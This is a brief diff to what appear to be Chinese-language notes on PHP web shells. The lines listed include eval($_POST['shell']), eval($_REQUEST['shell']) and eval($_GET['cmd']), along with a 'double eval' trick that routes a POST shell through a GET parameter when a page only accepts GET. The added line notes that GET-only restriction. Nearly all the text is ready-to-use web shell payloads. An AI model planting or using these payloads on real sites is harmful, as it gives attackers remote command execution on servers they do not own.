@@ -15,7 +15,7 @@ eval($_POST['shell']);
 eval("$_POST[shell]");
 eval($_REQUEST['shell']);
 
-双层eval：如果是$_GET['shell']，需要转换成post
+双层eval：如果是$_GET['shell']，需要转换成post。且有的页面不能POST只能GET
 eval($_GET['cmd']);  
 1. ?cmd=''eval($_POST['shell']); ?shell=echo 123;''
 等价于php执行=> eval('eval($_POST["shell"]);'); 或 eval('eval($_POST[\'shell\']);');
